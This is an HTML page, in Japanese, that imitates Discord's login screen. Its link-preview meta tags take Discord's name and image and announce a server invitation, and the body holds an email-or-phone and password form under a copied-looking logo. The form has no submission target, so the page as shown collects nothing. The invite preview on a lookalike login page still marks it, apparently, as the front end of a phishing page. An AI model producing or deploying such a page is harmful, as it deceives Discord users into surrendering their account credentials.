<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    
    <meta property="og:type" content="website">
    <meta property="og:title" content="サーバーへの招待を受け取りました">
    <meta property="og:description" content="Discordで友達やコミュニティと一緒に過ごしましょう。">
    <meta property="og:image" content="https://discord.com/assets/ee7c382d92576551b885.png">
    <meta property="og:site_name" content="Discord">
    <meta name="theme-color" content="#5865F2">

    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <div class="logo-wrapper">
                <svg width="124" height="28" viewBox="0 0 124 28" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M18.9 0C18.9 0 16.3 2.6 15.3 4.1C18.4 4.9 21.6 6.3 24.1 8.3C21.7 7.1 19.3 6.2 16.8 5.6C14.7 5.1 12.6 4.9 10.6 5C10 5.1 9.4 5.1 8.8 5.2C8.6 5.2 8.5 5.2 8.4 5.2C8.2 5.2 7.9 5.3 7.7 5.3C6.4 5.5 5.1 5.7 3.9 6C2.6 6.3 1.2 6.8 0 7.5C0.3 7.3 0.6 7.1 1 7C2.4 6.3 3.9 5.8 5.3 5.4C5.1 5.4 4.9 5.4 4.7 5.3C3 4.9 1.4 4.6 0 4.5L1.5 2.1C0.3 1.3 -0.8 0.5 -1.9 0L18.9 0Z" fill="white" transform="translate(0, 10)"/>
                    <circle cx="7" cy="18" r="2" fill="white"/>
                    <circle cx="17" cy="18" r="2" fill="white"/>
                </svg>
            </div>

            <div class="login-header">
                <h2>おかえりなさい！</h2>
                <p>また会えて嬉しいです！</p>
            </div>
            
            <form class="login-form">
                <div class="form-group">
                    <label>メールアドレスまたは電話番号 <span class="required">*</span></label>
                    <input type="text" name="email" required>
                </div>
                
                <div class="form-group">
                    <label>パスワード <span class="required">*</span></label>
                    <input type="password" name="password" required>
                    <a href="#" class="forgot-password">パスワードをお忘れですか？</a>
                </div>
                
                <button type="submit" class="login-button">ログイン</button>
                
                <div class="register-text">
                    アカウントが必要ですか？ <a href="#">登録</a>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
